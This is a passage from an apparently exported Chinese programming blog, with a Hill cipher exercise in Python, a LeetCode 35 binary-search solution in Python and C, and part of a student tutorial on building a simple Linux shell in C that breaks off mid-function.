<p>逆置换：[2,1,6,4,0,5,3]</p>
<p>(3) Hill密码 </p>
<p>参数选取：密钥矩阵和明文/密文的元素均取自 Z26</p>
<p>密钥矩阵为：<img src="https://i.loli.net/2019/12/20/4cajiulRt3BH8eF.png" alt="UTOOLS1576823947931.png"></p>
<p>加解密：若明文为7,8,11,11, 计算密文；若密文为9,8,8,24，计算明文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod26</span><span class="params">(A)</span>:</span></span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">        B.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            j %= <span class="number">26</span></span><br><span class="line">            B[<span class="number">-1</span>].append(j)</span><br><span class="line">    <span class="keyword">return</span> B</span><br><span class="line"></span><br><span class="line">A_list = [[<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>],</span><br><span class="line">          [<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">          [<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">9</span>],</span><br><span class="line">          [<span class="number">10</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">4</span>]]</span><br><span class="line"><span class="comment">#求逆</span></span><br><span class="line">K = np.linalg.inv(A_list)</span><br><span class="line">K_int = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    K_int.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        K_int[<span class="number">-1</span>].append(int(round(j))) <span class="comment">#round用来四舍五入</span></span><br><span class="line">A_list_inverse = mod26(K_int)</span><br><span class="line"><span class="comment">#矩阵化</span></span><br><span class="line">A = np.array(mod26(A_list))</span><br><span class="line">A_inverse = np.array(A_list_inverse)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>): <span class="comment">#python矩阵模块的使用</span></span><br><span class="line">    select = input(<span class="string">"1,加密 2,解密："</span>)</span><br><span class="line">    s = input(<span class="string">"输入(逗号相隔)："</span>)</span><br><span class="line">    S_list = s.split(<span class="string">','</span>)</span><br><span class="line">    S_list_int = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> S_list:</span><br><span class="line">        S_list_int.append(int(i))</span><br><span class="line">    S = np.array(S_list_int)</span><br><span class="line">    <span class="keyword">if</span> select == <span class="string">'1'</span>:</span><br><span class="line">        OUT = np.dot(S,A)</span><br><span class="line">        OUT_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> OUT:</span><br><span class="line">            OUT_list.append(i%<span class="number">26</span>)</span><br><span class="line">        print(OUT_list)</span><br><span class="line">    <span class="keyword">elif</span> select == <span class="string">'2'</span>:</span><br><span class="line">        OUT = np.dot(S,A_inverse)</span><br><span class="line">        OUT_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> OUT:</span><br><span class="line">            OUT_list.append(i%<span class="number">26</span>)</span><br><span class="line">        print(OUT_list)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>对矩阵取模函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod26</span><span class="params">(A)</span>:</span></span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">        B.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            j %= <span class="number">26</span></span><br><span class="line">            B[<span class="number">-1</span>].append(j)<span class="comment">#加入到B新增的元素中，该元素为1*n矩阵</span></span><br><span class="line">    <span class="keyword">return</span> B</span><br></pre></td></tr></table></figure>

<p>A为n*n矩阵，for i in A 则遍历n次，</p>
<p>每次i为1*n矩阵，用for j in i 遍历i，对j取模26，在加入B中。</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解35</title>
    <url>/2020/01/23/LeetCode%E9%A2%98%E8%A7%A335/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第35题，搜索插入位置</strong></p>
<p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p>
<p>你可以假设数组中无重复元素。</p>
<blockquote>
<p>示例 1:</p>
<p>输入: [1,3,5,6], 5<br>输出: 2</p>
<p>示例 2:</p>
<p>输入: [1,3,5,6], 2<br>输出: 1</p>
<p>示例 3:</p>
<p>输入: [1,3,5,6], 7<br>输出: 4</p>
<p>示例 4:</p>
<p>输入: [1,3,5,6], 0<br>输出: 0</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        end = len(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> start + <span class="number">1</span> &lt; end :</span><br><span class="line">            mid = int((start + end)/<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> nums[mid] &lt;= target : </span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">        <span class="keyword">if</span> nums[start] &gt;= target :</span><br><span class="line">            <span class="keyword">return</span> start</span><br><span class="line">        <span class="keyword">if</span> nums[end] &gt;= target :</span><br><span class="line">            <span class="keyword">return</span> end</span><br><span class="line">        <span class="keyword">return</span> end+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/23/1V3BHs.png" alt="1V3BHs.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">end</span> = numsSize - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(start + <span class="number">1</span> &lt; <span class="built_in">end</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (start + <span class="built_in">end</span>)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &lt;= target)&#123;</span><br><span class="line">            start = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">end</span> = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nums[<span class="built_in">end</span>] &gt;= target)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">end</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">end</span>+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/23/1V8aPx.png" alt="1V8aPx.png"></p>
<p><strong>解析：</strong></p>
<p>使用二分法查找：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(start + <span class="number">1</span> &lt; <span class="built_in">end</span>)&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (start + <span class="built_in">end</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(nums[mid] &lt;= target)&#123;</span><br><span class="line">        start = mid;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       	<span class="built_in">end</span> = mid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用mid将范围区间不断缩小，最后使其定位到[start，end]之间，其中end = start + 1。</p>
<p>循环条件为start + 1 &lt; end ，等价于 start + 1 != end。</p>
<p>已知有序数组nums和target。则存在多种情况：</p>
<ol>
<li><p>target &lt; nums[0]</p>
<p>则此时start = 0 ，end = 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 0。</p>
</li>
<li><p>target = nums[i]</p>
<p>则此时start = i，end = i + 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 i。</p>
</li>
<li><p>target &gt; nums[i]   target &lt; nums[i+1]</p>
<p>则此时start = i，end = i + 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[<span class="built_in">end</span>] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">end</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 i + 1。</p>
</li>
<li><p>target &gt; nums[numsSize - 1]</p>
<p>则此时start = numsSize - 2，end = numsSize - 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">end</span>+<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>则返回numsSize。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux环境下用c实现简易shell程序</title>
    <url>/2020/01/22/%E5%9C%A8Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%94%A8c%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93shell%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        这学期学校开设了操作系统的课程，但是内容比较浅显基础，我认为操作系统作为程序员的基本功之一，比较重要，也就想自己多学点，就想用<strong>c语言</strong>写一个在<strong>linux操作系统</strong>上的<strong>shell</strong>，顺便复习一下大一学的c语言，也在用<strong>《c和指针》</strong>去复习，不得不说，这本书确实写的不错，当然，对初学者不是那么友好，有一定基础的人可以去看，很不错。</p>
<p>最后，这篇文章里的代码可以在<a href="https://gitee.com/BMooS/myshell" target="_blank" rel="noopener">这里</a> (gitee)或者<a href="https://github.com/BMooS/master" target="_blank" rel="noopener">这里</a> (github)看到。</p>
<p>顺便说一下，作者再写这个程序时候只是一个在读学生，有些错误和粗浅之处，欢迎大家指正，谢谢大家。</p>
<a id="more"></a>

<h1 id="如何实现shell-以及整体框架"><a href="#如何实现shell-以及整体框架" class="headerlink" title="如何实现shell 以及整体框架"></a>如何实现shell 以及整体框架</h1><p>​        首先让我们明白一个shell的<strong>生命周期</strong>，任何事物都有自己的生命周期，shell自然也不例外。</p>
<p>我们启动终端，终端就开始加载shell程序，</p>
<ul>
<li><p><strong>首先</strong> shell会有自己的初始化，即加载并执行配置文件，这些配置会改变shell的行为</p>
</li>
<li><p><strong>然后</strong> shell程序启动，不断从标准输入中读取内容，并试图理解和执行这些内容</p>
</li>
<li><p><strong>最后</strong> 当所有命令完成后，控制shell程序关闭，并自动清除内存，自然退出</p>
</li>
</ul>
<p>  <em>这样的程序描述自然过于简单，正常且普遍的shell的程序执行自然比这个复杂，但大体是这样的一个流程。</em></p>
<p>  接下来我们简易去实现这个框架</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//配置文件</span></span><br><span class="line">    <span class="comment">//循环运行执行程序</span></span><br><span class="line">    my_shell_loop();</span><br><span class="line">    <span class="comment">//shell程序退出</span></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里我们用循环去实现shell程序的主体部分，但shell程序不仅仅只有循环。</p>
<h1 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h1><h2 id="loop循环梗概"><a href="#loop循环梗概" class="headerlink" title="loop循环梗概"></a>loop循环梗概</h2><p>​        接下来让我们探讨loop循环的实现</p>
<p>​        shell程序在执行中不断<strong>读取</strong>标准输入中的内容，并加以<strong>分析执行</strong>，最后反馈给用户。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">line</span>;</span><br><span class="line">    <span class="keyword">int</span> state = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"myshell -&gt; "</span>);</span><br><span class="line">        <span class="comment">//读取标准输入中的内容，保存在line里面</span></span><br><span class="line">        <span class="built_in">line</span> = shell_readline();</span><br><span class="line">        <span class="comment">//分析并加以执行</span></span><br><span class="line">        state = execute_line(<span class="built_in">line</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>(state);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="命令读入"><a href="#命令读入" class="headerlink" title="命令读入"></a>命令读入</h2><p>​        这里我们自己写入一个readline函数，具体分析程序是如何运作的。</p>
<p><strong>注意</strong> 这里我们引入了动态内存，因为我们不可能限制并给定用户的输入长度，用户输入的字符串长度是未知的，所以这里使用动态内存来储存字符串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">shell_readline</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">1024</span>; <span class="comment">//初始给定1024字符的长度</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);<span class="comment">//缓存区里开辟bufsize大小的内存</span></span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123; <span class="comment">//检查返回值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        c = getchar();</span><br><span class="line">        <span class="keyword">if</span>(c == EOF || c == <span class="string">'\n'</span>)&#123;</span><br><span class="line">            <span class="built_in">buffer</span>[i] = <span class="string">'\0'</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">buffer</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">buffer</span>[i] = c;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= bufsize)&#123; <span class="comment">//当现有字符串数量大于bufsize时，重新分配2倍大小的内存空间</span></span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            <span class="built_in">buffer</span> = <span class="built_in">realloc</span>(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123; <span class="comment">//检查返回指针</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong> 在使用动态内存的时候一定要<strong>小心</strong>以下几点</p>
<ul>
<li>调用malloc函数和realloc函数的时候要检查返回值，因为当申请新内存而现有资源不够的时候，就会返回NULL, 这是一个“null pointer”（空指针）</li>
<li>当然调用realloc函数时候，传递参值的时候也要小心，不要传递一个NULL，也不要传递一个非动态内存返回的指针</li>
<li>最后，<strong>一定一定</strong>注意内存的回收，即调用free()函数，回收动态内存空间，free函数的参值也是一个动态内存返回的指针，如果不回收动态内存，编译器不会报错，但是会造成<strong>内存泄漏</strong>，这是要极力避免的事情</li>
</ul>
<p>这样就简易实现了一个readline函数，简单且实用，但是我们想要实现bash，zsh这些著名shell里，可以使用上下键调用历史命令，可以用tab键补全命令这些功能就有些无力了，好在我们有现成的轮子可以套用，那就是readline库。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;readline/history.h&gt;</span></span></span><br><span class="line"><span class="built_in">line</span> = readline(<span class="string">"Myshell -&gt; "</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">line</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">add_history(<span class="built_in">line</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="built_in">line</span>);</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> </p>
<ul>
<li><p>readline库是一个<strong>动态连接库</strong>，gcc编译时候需要动态链接，使用一下指令即可： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc main.c -lreadline</span><br></pre></td></tr></table></figure>
</li>
<li><p>readline函数返回值是一个指针，指向一个动态内存区域，也需要判别是否为NULL以及使用free函数释放掉，防止内存泄漏</p>
</li>
<li><p>作者在这里只是很粗浅的使用，只是用了add_history()函数用于添加历史指令，readline函数有更高阶的操作，具体在这里<a href="https://tiswww.case.edu/php/chet/readline/readline.html" target="_blank" rel="noopener">官方文档</a>(注：需要一点科学上网手段)</p>
</li>
</ul>
<p>  在这里，作者发现原始的颜色太单调，我们可以调制一些颜色对于shell提示输入符：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLOSE <span class="meta-string">"\001\033[0m\002"</span>                 <span class="comment">// 关闭所有属性</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLOD  <span class="meta-string">"\001\033[1m\002"</span>                 <span class="comment">// 强调、加粗、高亮</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BEGIN(x,y) <span class="meta-string">"\001\033["</span>#x<span class="meta-string">";"</span>#y<span class="meta-string">"m\002"</span>	<span class="comment">// x: 背景，y: 前景</span></span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">line</span> = readline(BEGIN(<span class="number">49</span>, <span class="number">34</span>)<span class="string">"Myshell-&gt;  "</span>CLOSE);<span class="comment">//使用一点宏定义简化一些复杂性</span></span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="https://i.loli.net/2019/12/15/78nbjUHFfsIBSQZ.png" alt="UTOOLS1576411800363.png"></p>
<p>这样就好看多了</p>
<h2 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h2><p>​        现在我们来构造<strong>execute_line()</strong>函数。</p>
<p>​         对于在shell里面输入一个命令，不仅有<strong>内部命令</strong>，即写入程序代码中的命令，和<strong>外部命令</strong>，即shell要fork一个新进程，进程去系统path中寻找可执行的程序去解析命令。还有对一个命令语句来说，有<strong>命令部分</strong>，还有<strong>参数部分</strong>，而我们要做的就是将一条命令语句中的参数和命令分开并处理。</p>
<p>​        即：</p>
<p>​                我们要在<strong>execute_line()</strong>构造<strong>cut_line()</strong>和<strong>execute()</strong>两个函数去实现。</p>
<h3 id="cut-line"><a href="#cut-line" class="headerlink" title="cut_line()"></a>cut_line()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> **<span class="title">cut_line</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">64</span>, i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> **tokens = <span class="built_in">malloc</span>(bufsize*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">    <span class="keyword">char</span> *token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!tokens)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    token = strtok(<span class="built_in">line</span>, <span class="string">" "</span>);</span><br><span class="line">    <span class="keyword">while</span> (token != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tokens[i] = token;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= bufsize)&#123;</span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            tokens = <span class="built_in">realloc</span>(tokens, bufsize*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">            <span class="keyword">if</span>(!tokens)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        token = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tokens[i] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> tokens;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在这里我们先申请了一个字符指针的指针，大小为64个单位，用来保存一个字符串数组。</p>
<p>​        在cut_line()中我们用C 标准库<strong>&lt;string.h&gt;</strong>中<strong>strtok()</strong>函数：</p>
<blockquote>
<p>C 库函数</p>
<p><strong>char *strtok(char *str, const char *delim)</strong></p>
<p>分解字符串 <strong>str</strong> 为一组字符串，<strong>delim</strong> 为分隔符。</p>
<p>该函数返回被分解的第一个子字符串，如果没有可检索的字符串，则返回一个空指针。</p>
</blockquote>
<p><strong>实例</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> str[<span class="number">80</span>] = <span class="string">"This is - BMooS - shell"</span>;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> s[<span class="number">2</span>] = <span class="string">"-"</span>;</span><br><span class="line">   <span class="keyword">char</span> *token;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* 获取第一个子字符串 */</span></span><br><span class="line">   token = strtok(str, s);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* 继续获取其他的子字符串 */</span></span><br><span class="line">   <span class="keyword">while</span>( token != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">      <span class="built_in">printf</span>( <span class="string">"%s\n"</span>, token );</span><br><span class="line">    </span><br><span class="line">      token = strtok(<span class="literal">NULL</span>, s);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<blockquote>
<p>This is</p>
<p>BMooS</p>
<p>shell</p>
</blockquote>
<p><strong>注意：</strong></p>
<ol>
<li>还是和上述一样，在动态分配内存的的时候注意是否分配成功以及分配的多少，这里我采用的是几何倍数增长大小需求。</li>
<li>在生成字符串数组的时候，记住在末尾加入空指针<strong>NULL</strong>。</li>
<li>cut_line()函数返回的是一个指向动态内存空间的指针，主要在外部调用的时候配合free()函数使用。</li>
</ol>
<h3 id="execute"><a href="#execute" class="headerlink" title="execute()"></a>execute()</h3><p>​        execute()函数接受上面cut_line()函数的<strong>返回值</strong>，即execute()函数的参数是一个字符串数组，从变量类型上说，就是字符指针的指针。</p>
<p>​        这里我们在构造的时候要想到<strong>对命令的提取</strong>，<strong>对命令的识别</strong>以及<strong>对命令的执行</strong>。我们上述说到，对一个命令来说，我们识别它是一个内部命令还是一个外部命令，以便对命令<strong>区分执行</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execute</span><span class="params">(<span class="keyword">char</span> **char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(char_list[<span class="number">0</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; long_cmd(); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(char_list[<span class="number">0</span>], cmder[i]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (*funcs[i])(char_list); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">process</span>(char_list);<span class="comment">//调用进程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>逻辑结构</strong></p>
<p>​        这里我们在构造execute()函数的时候我们对<strong>char_list[0]</strong>进行判空，不为空即有命令，我们要遍历我们在shell程序中编写的<strong>内部命令函数</strong>，看输入命令是否于其中内部命令匹配，若不匹配，则为外部命令，这时我们要调用我们编写的<strong>process()</strong>单独执行。</p>
<p><strong>内部命令</strong></p>
<p>​        我们这里需要构造一个字符串数组和一个自定义函数以及一个转换表：</p>
<ol>
<li>内部命令列表</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *cmder[] = &#123;</span><br><span class="line">    <span class="string">"cd"</span>,</span><br><span class="line">    <span class="string">"pwd"</span>,</span><br><span class="line">    <span class="string">"help"</span>,</span><br><span class="line">    <span class="string">"exit"</span>,</span><br><span class="line">    <span class="string">"echo"</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>返回内部命令列表长度的整型函数</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">long_cmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">sizeof</span>(cmder)/<span class="keyword">sizeof</span>(<span class="keyword">char</span>*);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>转换表—函数指针数组</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> (*funcs[])(<span class="keyword">char</span>**) = &#123;</span><br><span class="line">    &amp;fun_cd,</span><br><span class="line">    &amp;fun_pwd,</span><br><span class="line">    &amp;fun_help,</span><br><span class="line">    &amp;fun_exit,</span><br><span class="line">    &amp;fun_echo</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​        <strong>内部命令是编写在shell程序里面的，是自定义的，我们对它们起名也是自定义的。</strong></p>
<p>​        <strong>注意：函数声明要在转换表之前</strong></p>
<p>现在让我们开始编写内部命令：</p>
<ol>
<li><strong>cd</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_cd</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(char_list[<span class="number">1</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Please enter the correct directory\n"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(chdir(char_list[<span class="number">1</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">"myshell"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span 